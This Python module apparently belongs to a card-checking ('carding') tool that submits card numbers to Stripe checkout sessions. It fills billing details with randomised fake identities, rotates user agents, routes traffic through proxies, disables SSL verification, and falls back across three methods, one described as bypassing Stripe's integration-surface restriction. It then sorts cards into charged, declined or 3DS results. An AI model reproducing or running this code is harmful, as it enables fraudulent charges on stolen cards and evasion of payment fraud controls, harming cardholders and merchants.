# -*- coding: utf-8 -*-
"""Stripe charge with multi-method fallback.
Method A: PaymentMethod → payment_pages/confirm
Method B: Token → PaymentIntent/confirm (bypasses integration surface restriction)
Method C: Token → payment_pages/confirm
Auto-detects "unsupported integration surface" and switches method.
"""
import time
import asyncio
import aiohttp

from billing_data import (
    random_full_name, random_email, random_address,
    random_user_agent, random_timezone, random_locale,
    build_stripe_headers,
)

_session = None
_site_method_cache: dict[str, str] = {}


async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=25, connect=8),
        )
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
    _session = None


def _is_surface_error(data: dict) -> bool:
    if "error" not in data:
        return False
    msg = (data["error"].get("message") or "").lower()
    return "integration surface" in msg or "unsupported for publishable key" in msg


def _extract_pi_info(init_data: dict) -> tuple[str, str]:
    pi = init_data.get("payment_intent") or {}
    client_secret = pi.get("client_secret", "")
    pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
    return pi_id, client_secret


def _get_amounts(init_data: dict) -> tuple[int, int]:
    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        return lig.get("total", 0), lig.get("subtotal", 0)
    if inv:
        return inv.get("total", 0), inv.get("subtotal", 0)
    pi = init_data.get("payment_intent") or {}
    amt = pi.get("amount", 0)
    return amt, amt


def _get_billing(init_data: dict) -> dict:
    cust = init_data.get("customer") or {}
    addr = cust.get("address") or {}
    billing = random_address()
    return {
        "name": cust.get("name") or billing["name"],
        "email": init_data.get("customer_email") or random_email(),
        "country": addr.get("country") or billing["country"],
        "line1": addr.get("line1") or billing["line1"],
        "city": addr.get("city") or billing["city"],
        "state": addr.get("state") or billing["state"],
        "postal_code": addr.get("postal_code") or billing["postal_code"],
    }


def _parse_confirm_response(conf: dict) -> tuple[str, str]:
    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        msg = err.get("message", "Failed")
        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
    pi = conf.get("payment_intent") or {}
    st = pi.get("status", "") or conf.get("status", "")
    if st == "succeeded":
        return "CHARGED", "Charged"
    if st == "requires_action":
        return "3DS", "3DS Required"
    if st == "requires_payment_method":
        return "DECLINED", "Declined"
    return "UNKNOWN", st or "Unknown"


async def _method_a(s, card, pk, cs, init_data, headers, proxy_url):
    """PaymentMethod → payment_pages/confirm"""
    b = _get_billing(init_data)
    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")

    pm_body = (
        f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"&billing_details[name]={b['name']}&billing_details[email]={b['email']}"
        f"&billing_details[address][country]={b['country']}"
        f"&billing_details[address][line1]={b['line1']}"
        f"&billing_details[address][city]={b['city']}"
        f"&billing_details[address][postal_code]={b['postal_code']}"
        f"&billing_details[address][state]={b['state']}&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers, data=pm_body, proxy=proxy_url,
    ) as r:
        pm = await r.json()

    if _is_surface_error(pm):
        return None

    if "error" in pm:
        return "DECLINED", pm["error"].get("message", "Card error")[:60]

    pm_id = pm.get("id")
    if not pm_id:
        return "FAILED", "No PM"

    conf_body = (
        f"eid=NA&payment_method={pm_id}&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=conf_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    if _is_surface_error(conf):
        return None

    return _parse_confirm_response(conf)


async def _create_token(s, card, pk, headers, proxy_url) -> dict:
    token_body = (
        f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
        f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
        f"&key={pk}"
    )
    async with s.post(
        "https://api.stripe.com/v1/tokens",
        headers=headers, data=token_body, proxy=proxy_url,
    ) as r:
        return await r.json()


async def _method_b(s, card, pk, cs, init_data, headers, proxy_url):
    """Token → PaymentIntent/confirm (direct PI confirm, bypasses payment_pages)"""
    pi_id, client_secret = _extract_pi_info(init_data)
    if not pi_id or not client_secret:
        return None

    tok = await _create_token(s, card, pk, headers, proxy_url)
    if "error" in tok:
        return "DECLINED", tok["error"].get("message", "Token error")[:60]

    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    b = _get_billing(init_data)
    confirm_body = (
        f"payment_method_data[type]=card"
        f"&payment_method_data[card][token]={tok_id}"
        f"&payment_method_data[billing_details][name]={b['name']}"
        f"&payment_method_data[billing_details][email]={b['email']}"
        f"&payment_method_data[billing_details][address][country]={b['country']}"
        f"&payment_method_data[billing_details][address][line1]={b['line1']}"
        f"&payment_method_data[billing_details][address][city]={b['city']}"
        f"&payment_method_data[billing_details][address][postal_code]={b['postal_code']}"
        f"&payment_method_data[billing_details][address][state]={b['state']}"
        f"&expected_payment_method_type=card"
        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
        f"&key={pk}&client_secret={client_secret}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        headers=headers, data=confirm_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def _method_c(s, card, pk, cs, init_data, headers, proxy_url):
    """Token → payment_pages/confirm (token-based with checkout session)"""
    tok = await _create_token(s, card, pk, headers, proxy_url)
    if "error" in tok:
        return "DECLINED", tok["error"].get("message", "Token error")[:60]

    tok_id = tok.get("id")
    if not tok_id:
        return "FAILED", "No token"

    total, subtotal = _get_amounts(init_data)
    checksum = init_data.get("init_checksum", "")
    b = _get_billing(init_data)

    conf_body = (
        f"eid=NA&payment_method_data[type]=card"
        f"&payment_method_data[card][token]={tok_id}"
        f"&payment_method_data[billing_details][name]={b['name']}"
        f"&payment_method_data[billing_details][email]={b['email']}"
        f"&payment_method_data[billing_details][address][country]={b['country']}"
        f"&payment_method_data[billing_details][address][line1]={b['line1']}"
        f"&payment_method_data[billing_details][address][city]={b['city']}"
        f"&payment_method_data[billing_details][address][postal_code]={b['postal_code']}"
        f"&payment_method_data[billing_details][address][state]={b['state']}"
        f"&expected_amount={total}"
        f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
        f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
        f"&last_displayed_line_item_group_details[total_discount_amount]=0"
        f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
        f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
    )
    async with s.post(
        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
        headers=headers, data=conf_body, proxy=proxy_url,
    ) as r:
        conf = await r.json()

    return _parse_confirm_response(conf)


async def charge_card_fast(
    card: dict, pk: str, cs: str, init_data: dict,
    proxy_url: str | None = None,
    max_retries: int = 2,
) -> dict:
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0}

    cached_method = _site_method_cache.get(cs)

    for attempt in range(max_retries + 1):
        try:
            ua = random_user_agent()
            headers = build_stripe_headers(ua)
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=25, connect=8),
            ) as s:
                res = None

                if cached_method == "B":
                    methods = [
                        ("B", _method_b),
                        ("C", _method_c),
                        ("A", _method_a),
                    ]
                elif cached_method == "C":
                    methods = [
                        ("C", _method_c),
                        ("B", _method_b),
                        ("A", _method_a),
                    ]
                else:
                    methods = [
                        ("A", _method_a),
                        ("B", _method_b),
                        ("C", _method_c),
                    ]

                for method_name, method_fn in methods:
                    res = await method_fn(s, card, pk, cs, init_data, headers, proxy_url)
                    if res is not None:
                        _site_method_cache[cs] = method_name
                        break

                if res is None:
                    result["status"] = "FAILED"
                    result["response"] = "All methods unsupported"
                else:
                    result["status"], result["response"] = res

                result["time"] = round(time.perf_counter() - start, 2)
                return result

        except Exception as e:
            err_str = str(e).lower()
            retryable = any(kw in err_str for kw in ("disconnect", "timeout", "connection", "reset"))
            if attempt < max_retries and retryable:
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = str(e)[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            return result

    return result


async def charge_card(
    card: dict, checkout_data: dict, proxy_url: str | None = None
) -> dict:
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        return {
            "card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}",
            "status": "FAILED",
            "response": "No PK/CS",
            "time": 0,
        }
    return await charge_card_fast(card, pk, cs, init_data, proxy_url)
